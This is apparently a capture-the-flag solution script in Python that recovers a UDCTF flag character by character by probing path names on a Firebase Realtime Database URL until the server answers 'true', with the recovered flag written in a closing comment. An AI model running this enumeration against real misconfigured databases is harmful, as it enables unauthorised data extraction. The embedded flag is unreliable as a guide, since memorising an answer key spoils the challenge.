import requests
import string

url = "https://best-bathroom-default-rtdb.firebaseio.com/flag/UDCTF"
ending = ".json"
flag = "UDCTF"

while "}" not in flag:
    
    for c in string.printable:
        if c == '/' or c == '\\':
            continue
        
        r = requests.get(url=url+c+ending)
        response = r.text
        
        if response == "true":
            flag += c
            url += c
            break
print(flag)
#UDCTF{1ce_L4br4t0ry_s3C0nd_Fl0or_b0y's_b4thr00m}